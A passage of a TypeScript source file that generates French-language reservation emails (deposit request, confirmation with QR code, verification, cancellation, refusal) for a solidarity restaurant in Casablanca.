              ${data.secondaryCtaLabel && data.secondaryCtaUrl ? `<p style="margin: 0 0 10px 0; color: #374151; font-size: 14px; text-align: center;">Une fois votre virement effectué, cliquez ici pour déposer votre preuve de virement.</p>
                <table role="presentation" style="border-collapse: collapse; margin: 0 auto 20px auto;">
                  <tr>
                    <td style="border-radius: 6px; background-color: #0f766e; text-align: center;">
                      <a href="${data.secondaryCtaUrl}" style="display: inline-block; padding: 12px 22px; color: #ffffff; text-decoration: none; font-weight: 600; font-size: 15px;">${data.secondaryCtaLabel}</a>
                    </td>
                  </tr>
                </table>` : ""}
              ${data.contactEmail || data.contactPhone ? `<p style="margin: 0 0 20px 0; color: #6b7280; font-size: 14px;">Une question ? Contactez-nous : ${data.contactEmail || ""}${data.contactEmail && data.contactPhone ? " / " : ""}${data.contactPhone || ""}</p>` : ""}
              ${signature}
            </td>
          </tr>
          <tr>
            <td style="background-color: #f8f9fa; border-top: 1px solid #e5e7eb; padding: 18px 24px; text-align: center; border-radius: 0 0 8px 8px;">
              ${footer}
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>
  `.trim();
}

function renderRestaurantEmailText(data: {
  preheader: string;
  title: string;
  introText?: string[];
  sections: RestaurantEmailSection[];
  ctaLabel?: string;
  ctaUrl?: string;
  secondaryCtaLabel?: string;
  secondaryCtaUrl?: string;
  contactEmail?: string;
  contactPhone?: string;
  signatureLines?: string[];
  footerLines: string[];
}): string {
  const sections = data.sections
    .map((section) => {
      const lines: string[] = [];
      if (section.title) lines.push(section.title);
      (section.text || []).forEach((line) => lines.push(line));
      (section.items || []).forEach((item) => lines.push(`- ${item.label}: ${item.value}`));
      return lines.join("\n");
    })
    .join("\n\n");

  const chunks = [
    data.preheader,
    "",
    data.title,
    "",
    ...(data.introText || []),
    "",
    sections,
    data.ctaLabel && data.ctaUrl ? `${data.ctaLabel}: ${data.ctaUrl}` : "",
    data.secondaryCtaLabel && data.secondaryCtaUrl ? `${data.secondaryCtaLabel}: ${data.secondaryCtaUrl}` : "",
    data.contactEmail || data.contactPhone
      ? `Une question ? Contactez-nous: ${data.contactEmail || ""}${data.contactEmail && data.contactPhone ? " / " : ""}${data.contactPhone || ""}`
      : "",
    "",
    ...(data.signatureLines || []),
    "",
    ...data.footerLines,
  ];

  return chunks.filter(Boolean).join("\n").trim();
}

interface RestaurantReservationEmailData {
  firstName: string;
  reference: string;
  reservationDateLong: string;
  reservationTime?: string;
  partySize: number;
  partySizeConfirmed?: number;
  depositPercent?: number;
  depositAmount?: number;
  estimatedTotal?: number;
  depositDeadlineFormatted?: string;
  ribUrl?: string;
  proofUploadUrl?: string;
  brandName?: string;
  headerColor?: string;
  contactEmail?: string;
  contactPhone?: string;
  addressLines?: string[];
}

interface RestaurantGroupVerificationEmailData {
  firstName: string;
  reference: string;
  reservationDateLong: string;
  partySize: number;
  verificationUrl: string;
  brandName?: string;
  headerColor?: string;
  contactEmail?: string;
  contactPhone?: string;
  addressLines?: string[];
}

function normalizeRestaurantBranding(data: RestaurantReservationEmailData): RestaurantEmailBranding {
  const addressLines = data.addressLines?.length
    ? data.addressLines
    : RESTAURANT_DEFAULT_BRANDING.addressLines;

  return {
    ...RESTAURANT_DEFAULT_BRANDING,
    brandName: data.brandName || RESTAURANT_DEFAULT_BRANDING.brandName,
    headerColor: data.headerColor || RESTAURANT_DEFAULT_BRANDING.headerColor,
    ribUrl: data.ribUrl || RESTAURANT_DEFAULT_BRANDING.ribUrl,
    contactEmail: data.contactEmail || RESTAURANT_DEFAULT_BRANDING.contactEmail,
    contactPhone: data.contactPhone || RESTAURANT_DEFAULT_BRANDING.contactPhone,
    addressLines,
    footerLines: [
      data.brandName || RESTAURANT_DEFAULT_BRANDING.brandName,
      ...addressLines,
      `Tél: ${data.contactPhone || RESTAURANT_DEFAULT_BRANDING.contactPhone} | ${data.contactEmail || RESTAURANT_DEFAULT_BRANDING.contactEmail}`,
    ],
  };
}

export function generateRestaurantReservationDepositRequiredEmail(data: RestaurantReservationEmailData): { subject: string; html: string; text: string } {
  const branding = normalizeRestaurantBranding(data);
  const depositPercent = data.depositPercent ?? 50;
  const sections: RestaurantEmailSection[] = [
    {
      title: "Détails de la réservation",
      kind: "info",
      items: [
        { label: "Date", value: data.reservationDateLong },
        ...(data.reservationTime ? [{ label: "Heure", value: data.reservationTime }] : []),
        { label: "Nombre estimé", value: String(data.partySize) },
        { label: "Référence", value: data.reference },
        ...(data.depositDeadlineFormatted
          ? [{ label: "Date limite de paiement", value: data.depositDeadlineFormatted }]
          : []),
      ],
    },
    {
      title: "Confirmation & acompte",
      kind: "callout",
      text: [
        `Pour confirmer votre réservation à ${branding.brandName}, merci de verser un acompte de ${depositPercent}% à l’avance.`,
        `Pour confirmer votre réservation à ${branding.brandName}, un acompte de ${depositPercent}% est requis.`,
        "⏳ Vous disposez de 48 heures à compter de la réception de cet email pour effectuer le versement.",
        "Passé ce délai, et sans réception de l’acompte, votre réservation sera automatiquement annulée.",
      ],
      items: [
        ...(typeof data.depositAmount === "number" ? [{ label: "Montant de l’acompte", value: `${data.depositAmount} MAD` }] : []),
        ...(typeof data.estimatedTotal === "number" ? [{ label: "Montant total estimé", value: `${data.estimatedTotal} MAD` }] : []),
        ...(data.depositDeadlineFormatted
          ? [{ label: "Date limite de paiement", value: data.depositDeadlineFormatted }]
          : []),
      ],
    },
  ];

  const layout: RestaurantEmailLayoutData = {
    preheader: "Votre demande est bien enregistrée. Acompte requis pour confirmation.",
    brandName: branding.brandName,
    headerColor: branding.headerColor,
    title: "Demande enregistrée / Acompte requis",
    introText: [
      `Bonjour ${data.firstName},`,
      "Votre demande de réservation groupe a bien été enregistrée.",
    ],
    sections,
    ctaLabel: "Télécharger le RIB",
    ctaUrl: branding.ribUrl,
    secondaryCtaLabel: data.proofUploadUrl ? "Déposer ma preuve de virement" : undefined,
    secondaryCtaUrl: data.proofUploadUrl,
    contactEmail: branding.contactEmail,
    contactPhone: branding.contactPhone,
    signatureLines: [
      "Merci pour votre soutien à notre restaurant solidaire 💚",
      "À très bientôt,",
      `L’équipe de ${branding.brandName}`,
    ],
    footerLines: branding.footerLines,
  };

  return {
    subject: `Demande de réservation enregistrée — ${branding.brandName} (Réf. ${data.reference})`,
    html: renderRestaurantEmailLayout(layout),
    text: renderRestaurantEmailText(layout),
  };
}

export function generateRestaurantReservationConfirmedEmail(data: RestaurantReservationEmailData): { subject: string; html: string; text: string } {
  const branding = normalizeRestaurantBranding(data);
  const confirmedSize = data.partySizeConfirmed ?? data.partySize;

  const layout: RestaurantEmailLayoutData = {
    preheader:
      "Votre réservation est confirmée. Voici les informations et la politique d’annulation.",
    brandName: branding.brandName,
    headerColor: branding.headerColor,
    title: "Réservation confirmée",
    introText: [
      `Bonjour ${data.firstName},`,
      `Votre réservation à ${branding.brandName} est confirmée. Nous sommes heureux de vous accueillir prochainement.`,
    ],
    sections: [
      {
        title: "Récapitulatif",
        kind: "info",
        items: [
          { label: "Date", value: data.reservationDateLong },
          ...(data.reservationTime ? [{ label: "Heure", value: data.reservationTime }] : []),
          { label: "Nombre de personnes", value: String(confirmedSize) },
          { label: "Référence", value: data.reference },
          { label: "Statut", value: "Confirmée" },
        ],
      },
      {
        title: "Politique d’annulation",
        kind: "warning",
        text: [
          "Annulation à moins de 72h : acompte de 50% conservé.",
          "Le nombre de personnes confirmé sera facturé en totalité, même en cas d’absence ou de modification le jour même.",
        ],
      },
    ],
    signatureLines: [
      "Merci pour votre confiance.",
      "Cordialement,",
      `L’équipe de ${branding.brandName}`,
    ],
    footerLines: branding.footerLines,
  };

  return {
    subject: `Réservation confirmée — ${branding.brandName} (Réf. ${data.reference})`,
    html: renderRestaurantEmailLayout(layout),
    text: renderRestaurantEmailText(layout),
  };
}

export function generateRestaurantGroupVerificationEmail(
  data: RestaurantGroupVerificationEmailData
): { subject: string; html: string; text: string } {
  const branding = normalizeRestaurantBranding(data);

  const layout: RestaurantEmailLayoutData = {
    preheader:
      "Confirmez votre email pour transmettre votre réservation groupe à l’administration.",
    brandName: branding.brandName,
    headerColor: branding.headerColor,
    title: "Validez votre réservation groupe",
    introText: [
      `Bonjour ${data.firstName},`,
      "Nous avons bien reçu votre demande de réservation groupe.",
      "Pour finaliser la demande et la transmettre à l’équipe d’administration, merci de confirmer votre adresse email.",
    ],
    sections: [
      {
        title: "Récapitulatif de la demande",
        kind: "info",
        items: [
          { label: "Date", value: data.reservationDateLong },
          { label: "Nombre de personnes", value: String(data.partySize) },
          { label: "Référence", value: data.reference },
          { label: "Statut", value: "En attente de confirmation email" },
        ],
      },
      {
        title: "Action requise",
        kind: "warning",
        text: [
          "Cliquez sur le bouton ci-dessous pour confirmer votre email.",
          "Sans cette confirmation, votre réservation ne sera pas traitée et ne sera pas transmise au tableau d’administration.",
        ],
      },
    ],
    ctaLabel: "Confirmer ma réservation groupe",
    ctaUrl: data.verificationUrl,
    contactEmail: branding.contactEmail,
    contactPhone: branding.contactPhone,
    signatureLines: [
      "Merci pour votre confiance.",
      `L’équipe de ${branding.brandName}`,
    ],
    footerLines: branding.footerLines,
  };

  return {
    subject: `Confirmation email requise — ${branding.brandName} (Réf. ${data.reference})`,
    html: renderRestaurantEmailLayout(layout),
    text: renderRestaurantEmailText(layout),
  };
}


export function generateRestaurantReservationAutoCancelledEmail(data: RestaurantReservationEmailData): { subject: string; html: string; text: string } {
  const branding = normalizeRestaurantBranding(data);

  const layout: RestaurantEmailLayoutData = {
    preheader: "Votre réservation a été annulée automatiquement faute de versement d’acompte dans les délais.",
    brandName: branding.brandName,
    headerColor: branding.headerColor,
    title: "Réservation annulée automatiquement",
    introText: [
      `Bonjour ${data.firstName},`,
      "Nous n’avons pas reçu l’acompte demandé dans le délai de 48h.",
    ],
    sections: [
      {
        title: "Détails de la réservation",
        kind: "info",
        items: [
          { label: "Date", value: data.reservationDateLong },
          ...(data.reservationTime ? [{ label: "Heure", value: data.reservationTime }] : []),
          { label: "Référence", value: data.reference },
          ...(data.depositDeadlineFormatted
            ? [{ label: "Date limite de paiement", value: data.depositDeadlineFormatted }]
            : []),
        ],
      },
      {
        title: "Annulation automatique",
        kind: "warning",
        text: [
          "Conformément à nos conditions, la réservation a été annulée automatiquement pour non-paiement de l’acompte dans les 48h.",
          `Pour toute nouvelle demande, contactez l’équipe de ${branding.brandName}.`,
        ],
      },
    ],
    contactEmail: branding.contactEmail,
    contactPhone: branding.contactPhone,
    signatureLines: [
      "Merci de votre compréhension.",
      "Cordialement,",
      `L’équipe de ${branding.brandName}`,
    ],
    footerLines: branding.footerLines,
  };

  return {
    subject: `Réservation annulée automatiquement — ${branding.brandName} (Réf. ${data.reference})`,
    html: renderRestaurantEmailLayout(layout),
    text: renderRestaurantEmailText(layout),
  };
}

export function formatReservationDateLong(dateIso: string): string {
  return toFrenchLongDate(dateIso);
}

export function formatCasablancaDateTimeLong(dateIso: string): string {
  const d = new Date(dateIso);
  if (Number.isNaN(d.getTime())) {
    return dateIso;
  }

  return new Intl.DateTimeFormat("fr-MA", {
    dateStyle: "full",
    timeStyle: "short",
    timeZone: "Africa/Casablanca",
  }).format(d);
}

// ============================================
// EMAILS POUR RÉSERVATIONS RESTAURANT
// ============================================

/**
 * Email 1 : Demande de réservation reçue (SANS QR CODE)
 * Envoyé immédiatement après soumission du formulaire
 */
export interface ReservationRequestEmailData {
  firstName: string;
  email: string;
  reservationType: 'particulier' | 'groupe' | 'entreprise';
  date: string;
  time: string;
  participantsCount: number;
  reference: string;
}

export function generateReservationRequestEmail(data: ReservationRequestEmailData): { subject: string; html: string } {
  const typeLabel = {
    particulier: 'Réservation particulier',
    groupe: 'Réservation groupe',
    entreprise: 'Réservation entreprise',
  }[data.reservationType];

  const content = `
    <h2 style="color: #5d5a3c; margin: 0 0 20px 0; font-size: 24px;">
      Demande de réservation reçue ✅
    </h2>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Cher(e) <strong>${data.firstName}</strong>,
    </p>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Merci pour votre demande de réservation. Nous avons bien reçu votre demande et notre équipe organisatrice l'étudiera dans les plus brefs délais.
    </p>
    
    <!-- Détails de la demande -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #f5f5f0; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #5d5a3c; margin: 0 0 15px 0; font-size: 18px;">📋 Détails de votre demande</h3>
          <p style="margin: 5px 0; color: #374151;"><strong>Type :</strong> ${typeLabel}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Date :</strong> ${data.date}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Nombre de participants :</strong> ${data.participantsCount}</p>
          <p style="margin: 10px 0 0 0; color: #6b7280; font-size: 14px;"><strong>Référence :</strong> ${data.reference}</p>
        </td>
      </tr>
    </table>

    <!-- Prochaines étapes -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #fef3c7; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #92400e; margin: 0 0 15px 0; font-size: 18px;">⏱️ Prochaines étapes</h3>
          <p style="margin: 0; color: #374151; line-height: 1.6;">
            Vous recevrez une confirmation par email sous <strong>48 heures</strong> avec les détails finaux et votre QR code d'accès.
          </p>
        </td>
      </tr>
    </table>

    <!-- Conditions de réservation -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #fff7ed; border: 1px solid #fed7aa; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #9a3412; margin: 0 0 15px 0; font-size: 18px;">⚠️ Conditions de réservation</h3>
          <p style="margin: 0 0 12px 0; color: #374151; font-size: 15px; line-height: 1.6;">
            <strong>Le nombre de personnes réservées sera facturé dans sa totalité, même en cas d'absence ou de modification le jour même.</strong>
          </p>
          <p style="margin: 0; color: #374151; font-size: 15px; line-height: 1.6;">
            Afin de confirmer votre réservation à Table du Jardin, nous vous remercions de bien vouloir verser <strong>50 % du montant</strong> à l'avance.
          </p>
        </td>
      </tr>
    </table>

    <!-- RIB -->
    <div style="text-align: center; margin: 20px 0;">
      <p style="margin: 0; color: #374151; font-size: 14px;"><strong>RIB :</strong> 007 780 0003 401 000 100 238 97<br/><strong>IBAN :</strong> MA64 007 780 0003 401 000 100 238 97</p>
    </div>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0;">
      Merci pour votre soutien à notre restaurant solidaire 💚
    </p>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0 0 0;">
      À très bientôt.<br>
      <strong>L'équipe Ftour Bab Rayan</strong>
    </p>
  `;

  return {
    subject: `✅ Demande de réservation reçue - Référence ${data.reference}`,
    html: baseTemplate(content),
  };
}

/**
 * Email 2 : Réservation confirmée (AVEC QR CODE)
 * Envoyé après validation par l'admin
 */
export interface ReservationConfirmationEmailData {
  firstName: string;
  email: string;
  reservationType: 'particulier' | 'groupe' | 'entreprise';
  date: string;
  time: string;
  participantsCount: number;
  reference: string;
  qrToken: string;
  baseUrl: string;
  space: string;
}

export function generateReservationConfirmationEmail(data: ReservationConfirmationEmailData): { subject: string; html: string } {
  const qrCodeUrl = getReservationQrCodeUrl(data.qrToken, data.baseUrl);
  const checkinUrl = `${data.baseUrl}/checkin-reservation/${data.qrToken}`;

  const content = `
    <h2 style="color: #5d5a3c; margin: 0 0 20px 0; font-size: 24px;">
      Votre réservation est confirmée ✅
    </h2>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Cher(e) <strong>${data.firstName}</strong>,
    </p>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Excellente nouvelle ! Votre réservation au Restaurant Solidaire a été confirmée. Nous vous attendons avec impatience !
    </p>
    
    <!-- Détails de la réservation -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #f5f5f0; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #5d5a3c; margin: 0 0 15px 0; font-size: 18px;">📋 Détails de votre réservation</h3>
          <p style="margin: 5px 0; color: #374151;"><strong>Espace :</strong> ${data.space}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Date :</strong> ${data.date}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Nombre de participants :</strong> ${data.participantsCount}</p>
          <p style="margin: 10px 0 0 0; color: #6b7280; font-size: 14px;"><strong>Référence :</strong> ${data.reference}</p>
        </td>
      </tr>
    </table>

    <!-- QR Code -->
    <div style="text-align: center; margin: 30px 0; padding: 20px; background-color: #ffffff; border: 2px dashed #d4a574; border-radius: 8px;">
      <h3 style="color: #5d5a3c; margin: 0 0 15px 0; font-size: 18px;">🎫 Votre QR Code d'accès</h3>
      <img src="${qrCodeUrl}" alt="QR Code" style="width: 200px; height: 200px; margin: 10px 0;" />
      <p style="color: #6b7280; font-size: 14px; margin: 10px 0 0 0;">
        Présentez ce QR code à l'entrée le jour de votre visite
      </p>
    </div>
    
    <!-- Consignes -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #fef3c7; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #92400e; margin: 0 0 15px 0; font-size: 18px;">📋 Consignes importantes</h3>
          <ul style="margin: 0; padding-left: 20px; color: #374151;">
            <li style="margin-bottom: 8px;">Arrivez 15 minutes avant l'heure de votre réservation</li>
            <li style="margin-bottom: 8px;">Présentez votre QR code à l'entrée</li>
            <li style="margin-bottom: 8px;">En cas d'annulation, prévenez-nous au moins 24h à l'avance</li>
          </ul>
        </td>
      </tr>
    </table>

    <!-- Conditions de réservation -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #fff7ed; border: 1px solid #fed7aa; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #9a3412; margin: 0 0 15px 0; font-size: 18px;">⚠️ Conditions de réservation</h3>
          <p style="margin: 0 0 12px 0; color: #374151; font-size: 15px; line-height: 1.6;">
            <strong>Le nombre de personnes réservées sera facturé dans sa totalité, même en cas d'absence ou de modification le jour même.</strong>
          </p>
          <p style="margin: 0; color: #374151; font-size: 15px; line-height: 1.6;">
            Afin de confirmer votre réservation à Table du Jardin, nous vous remercions de bien vouloir verser <strong>50 % du montant</strong> à l'avance.
          </p>
        </td>
      </tr>
    </table>

    <!-- RIB -->
    <div style="text-align: center; margin: 20px 0;">
      <p style="margin: 0; color: #374151; font-size: 14px;"><strong>RIB :</strong> 007 780 0003 401 000 100 238 97<br/><strong>IBAN :</strong> MA64 007 780 0003 401 000 100 238 97</p>
    </div>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0;">
      Merci pour votre soutien à notre restaurant solidaire 💚
    </p>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0 0 0;">
      À très bientôt.<br>
      <strong>L'équipe Ftour Bab Rayan</strong>
    </p>
  `;

  return {
    subject: `✅ Réservation confirmée - ${data.date} à ${data.time}`,
    html: baseTemplate(content),
  };
}


// ============================================
// EMAILS TRANSACTIONNELS - MODULE PARTICULIERS
// ============================================

/**
 * Email 1 : Demande reçue (SANS QR)
 * Envoyé automatiquement à la soumission
 */
export interface ParticulierReservationRequestEmailData {
  firstName: string;
  email: string;
  date: string;
  participantsCount: number;
  reference: string;
  displayChoice?: string;
}

export function generateParticulierReservationRequestEmail(data: ParticulierReservationRequestEmailData): { subject: string; html: string } {
  const content = `
    <h2 style="color: #5d5a3c; margin: 0 0 20px 0; font-size: 24px;">
      Votre demande de réservation a bien été reçue
    </h2>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Bonjour <strong>${data.firstName}</strong>,
    </p>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Nous avons bien reçu votre demande de réservation pour le ftour solidaire du <strong>${data.date}</strong>.
    </p>
    
    <!-- Détails de la demande -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #f5f5f0; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #5d5a3c; margin: 0 0 15px 0; font-size: 18px;">📋 Détails de votre demande</h3>
          <p style="margin: 5px 0; color: #374151;"><strong>Date :</strong> ${data.date}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Nombre de places :</strong> ${data.participantsCount}</p>
          ${data.displayChoice ? `<p style="margin: 5px 0; color: #374151;"><strong>Salle :</strong> ${data.displayChoice}</p>` : ''}
          <p style="margin: 10px 0 0 0; color: #6b7280; font-size: 14px;"><strong>Référence :</strong> ${data.reference}</p>
        </td>
      </tr>
    </table>
    
    <!-- Message important -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #e0f2fe; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <p style="margin: 0; color: #0369a1; font-size: 16px;">
            <strong>⏳ Notre équipe étudiera votre demande et vous confirmera la disponibilité sous 48 heures.</strong>
          </p>
        </td>
      </tr>
    </table>

    <!-- Conditions de réservation -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #fff7ed; border: 1px solid #fed7aa; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #9a3412; margin: 0 0 15px 0; font-size: 18px;">⚠️ Conditions de réservation</h3>
          <p style="margin: 0 0 12px 0; color: #374151; font-size: 15px; line-height: 1.6;">
            <strong>Le nombre de personnes réservées sera facturé dans sa totalité, même en cas d'absence ou de modification le jour même.</strong>
          </p>
          <p style="margin: 0; color: #374151; font-size: 15px; line-height: 1.6;">
            Afin de confirmer votre réservation à Table du Jardin, nous vous remercions de bien vouloir verser <strong>50 % du montant</strong> à l'avance.
          </p>
        </td>
      </tr>
    </table>

    <!-- RIB -->
    <div style="text-align: center; margin: 20px 0;">
      <p style="margin: 0; color: #374151; font-size: 14px;"><strong>RIB :</strong> 007 780 0003 401 000 100 238 97<br/><strong>IBAN :</strong> MA64 007 780 0003 401 000 100 238 97</p>
    </div>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0;">
      Merci pour votre soutien à notre restaurant solidaire 💚
    </p>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0 0 0;">
      À très bientôt.<br>
      <strong>L'équipe Ftour Bab Rayan</strong>
    </p>
  `;

  return {
    subject: `📬 Votre demande de réservation a bien été reçue`,
    html: baseTemplate(content),
  };
}

/**
 * Email 2 : Réservation confirmée + QR CODE
 * Envoyé après validation admin
 */
export interface ParticulierReservationConfirmedEmailData {
  firstName: string;
  email: string;
  date: string;
  participantsCount: number;
  reference: string;
  qrToken: string;
  baseUrl: string;
}

export function generateParticulierReservationConfirmedEmail(data: ParticulierReservationConfirmedEmailData): { subject: string; html: string } {
  const content = `
    <h2 style="color: #5d5a3c; margin: 0 0 20px 0; font-size: 24px;">
      Votre réservation est confirmée ✅
    </h2>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Bonjour <strong>${data.firstName}</strong>,
    </p>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Excellente nouvelle ! Votre demande de réservation pour le <strong>${data.date}</strong> a été validée.
    </p>
    
    <!-- Détails de la réservation -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #f5f5f0; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #5d5a3c; margin: 0 0 15px 0; font-size: 18px;">📋 Détails de votre réservation</h3>
          <p style="margin: 5px 0; color: #374151;"><strong>Date :</strong> ${data.date}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Nombre de places confirmées :</strong> ${data.participantsCount}</p>
          <p style="margin: 10px 0 0 0; color: #6b7280; font-size: 14px;"><strong>Référence :</strong> ${data.reference}</p>
        </td>
      </tr>
    </table>
    
    <!-- QR Code -->
    <div style="text-align: center; margin: 30px 0; padding: 20px; background-color: #ffffff; border: 2px dashed #d4a574; border-radius: 8px;">
      <h3 style="color: #5d5a3c; margin: 0 0 15px 0; font-size: 18px;">🎛 Votre QR Code d'accès</h3>
      <img src="${getReservationQrCodeUrl(data.qrToken, data.baseUrl)}" alt="QR Code" style="width: 200px; height: 200px; margin: 10px 0;" />
      <p style="color: #6b7280; font-size: 14px; margin: 10px 0 0 0;">
        Présentez ce QR code à l'entrée le jour de votre visite
      </p>
    </div>

    <!-- Consignes -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #fef3c7; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #92400e; margin: 0 0 15px 0; font-size: 18px;">📋 Consignes importantes</h3>
          <ul style="margin: 0; padding-left: 20px; color: #374151;">
            <li style="margin-bottom: 8px;">Présentez votre QR code à l'entrée le jour de votre visite</li>
            <li style="margin-bottom: 8px;">Arrivez 15 minutes avant l'heure de votre réservation</li>
            <li style="margin-bottom: 8px;">En cas d'annulation, prévenez-nous au moins 24h à l'avance</li>
          </ul>
        </td>
      </tr>
    </table>

    <!-- Conditions de réservation -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #fff7ed; border: 1px solid #fed7aa; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #9a3412; margin: 0 0 15px 0; font-size: 18px;">⚠️ Conditions de réservation</h3>
          <p style="margin: 0 0 12px 0; color: #374151; font-size: 15px; line-height: 1.6;">
            <strong>Le nombre de personnes réservées sera facturé dans sa totalité, même en cas d'absence ou de modification le jour même.</strong>
          </p>
          <p style="margin: 0; color: #374151; font-size: 15px; line-height: 1.6;">
            Afin de confirmer votre réservation à Table du Jardin, nous vous remercions de bien vouloir verser <strong>50 % du montant</strong> à l'avance.
          </p>
        </td>
      </tr>
    </table>

    <!-- RIB -->
    <div style="text-align: center; margin: 20px 0;">
      <p style="margin: 0; color: #374151; font-size: 14px;"><strong>RIB :</strong> 007 780 0003 401 000 100 238 97<br/><strong>IBAN :</strong> MA64 007 780 0003 401 000 100 238 97</p>
    </div>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0;">
      Merci pour votre soutien à notre restaurant solidaire 💚
    </p>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0 0 0;">
      À très bientôt.<br>
      <strong>L'équipe Ftour Bab Rayan</strong>
    </p>
  `;

  return {
    subject: `✅ Votre réservation est confirmée - Paiement requis`,
    html: baseTemplate(content),
  };
}

/**
 * Email 3 : Refus de réservation
 * Envoyé si le créneau est complet
 */
export interface ParticulierReservationRefusedEmailData {
  firstName: string;
  email: string;
  date: string;
}

export function generateParticulierReservationRefusedEmail(data: ParticulierReservationRefusedEmailData): { subject: string; html: string } {
  const content = `
    <h2 style="color: #dc2626; margin: 0 0 20px 0; font-size: 24px;">
      Demande de réservation - Indisponibilité
    </h2>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Bonjour <strong>${data.firstName}</strong>,
    </p>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Nous vous remercions pour votre demande de réservation.
    </p>
    
    <!-- Message -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #fee2e2; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <p style="margin: 0; color: #991b1b; font-size: 16px;">
            <strong>Malheureusement, le créneau du ${data.date} est complet.</strong>
          </p>
          <p style="margin: 10px 0 0 0; color: #991b1b; font-size: 14px;">
            Nous vous invitons à sélectionner une autre date encore disponible.
          </p>
        </td>
      </tr>
    </table>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0;">
      N'hésitez pas à nous contacter si vous avez des questions.
    </p>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0 0 0;">
      À très bientôt !<br>
      <strong>L'équipe Ftour Bab Rayan</strong>
    </p>
  `;

  return {
    subject: `❌ Demande de réservation - Créneau indisponible`,
    html: baseTemplate(content),
  };
}

export interface RestaurantReservationRejectedEmailData {
  firstName: string;
  brandName?: string;
  reference?: string;
  reservationDateLong: string;
  reservationTime?: string;
  partySize: number;
  rejectionReason?: string;
  rescheduleUrl?: string;
  contactEmail: string;
  contactPhone: string;
  footerLines?: string[];
}

export function generateRestaurantReservationRejectedEmail(
  data: RestaurantReservationRejectedEmailData,
): { subject: string; html: string; text: string } {
  const brandName = data.brandName || "La Table du Jardin";
  const subject = data.reference
    ? `Réservation non disponible — ${brandName} (Réf. ${data.reference})`
    : `Réservation non disponible — ${brandName}`;

  const reasonHtml = data.rejectionReason
    ? `
      <table role="presentation" style="width:100%;border-collapse:collapse;background-color:#fff7ed;border:1px solid #fed7aa;border-radius:8px;margin:18px 0;">
        <tr>
          <td style="padding:18px;">
            <h3 style="margin:0 0 8px 0;color:#7c2d12;font-size:17px;">Pourquoi ?</h3>
            <p style="margin:0;color:#374151;font-size:15px;line-height:1.5;">${escapeHtml(data.rejectionReason)}</p>
          </td>
        </tr>
      </table>
    `
    : "";

  const actionButtonHtml = data.rescheduleUrl
    ? `
      <table role="presentation" style="width:100%;border-collapse:collapse;margin:20px 0;">
        <tr>
          <td align="center">
            <a href="${data.rescheduleUrl}" style="display:inline-block;background-color:#556B2F;color:#ffffff;text-decoration:none;font-weight:700;font-size:15px;padding:12px 22px;border-radius:6px;">Choisir un autre créneau</a>
          </td>
